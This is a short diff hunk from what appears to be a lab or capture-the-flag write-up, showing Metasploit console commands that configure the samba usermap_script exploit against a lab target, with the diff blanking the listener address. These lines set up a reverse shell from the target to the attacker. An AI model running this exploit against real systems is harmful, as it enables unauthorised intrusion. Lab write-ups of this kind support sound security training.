@@ -52,7 +52,7 @@ msf6 exploit(multi/samba/usermap_script) > set rhosts 10.10.10.3
 ```
 
 ```bash
-msf6 exploit(multi/samba/usermap_script) > set lhost 10.10.14.17
+msf6 exploit(multi/samba/usermap_script) > set lhost 
 ```
 
 ```bash
